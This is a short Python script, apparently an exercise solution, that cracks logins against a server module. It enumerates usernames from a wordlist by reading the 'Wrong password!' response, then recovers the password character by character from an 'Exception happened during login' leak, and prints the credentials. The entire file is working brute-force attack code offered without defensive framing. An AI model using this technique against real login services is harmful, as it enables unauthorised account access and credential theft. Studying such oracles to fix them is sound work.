"""Password cracking module."""
import json
from string import ascii_letters, digits
from server import Server

class PasswordCracking:
    """Password cracking class."""

    def __init__(self):
        """Initialize password cracking class."""
        self.server = Server()

    def __login_list_load(self) -> str:
        """Load login list."""
        with open("logins.txt", "r", encoding="utf-8") as file:
            logins = file.read().splitlines()
        for login in logins:
            yield login.strip()

    def crack(self) -> dict:
        """Crack password."""
        server_login = ""
        for login in self.__login_list_load():
            response = json.loads(self.server.request(
                json.dumps({"login": login, "password": "-"})))
            result = response["result"]
            if result == "Wrong password!":
                server_login = login
                print(f"login: {server_login}")
                break
            if result == "Connection success!":
                return {"login": login, "password": ""}

        password_template = ""
        while True:
            for symbol in ascii_letters + digits:
                response = self.server.request(
                    json.dumps({"login": server_login, "password": password_template + symbol}))
                if response == '{"result": "Connection success!"}':
                    return {"login": server_login, "password": password_template + symbol}
                if response == '{"result": "Wrong password!"}':
                    continue
                if response == '{"result": "Exception happened during login"}':
                    password_template += symbol
                    print(f"password: {password_template}")
                    break

if __name__ == "__main__":
    password_cracking = PasswordCracking()
    cracking_result = password_cracking.crack()
    print("Done!")
    cracked_login = cracking_result["login"]
    cracked_password = cracking_result["password"]
    print(f"login: {cracked_login}")
    print(f"password: {cracked_password}")
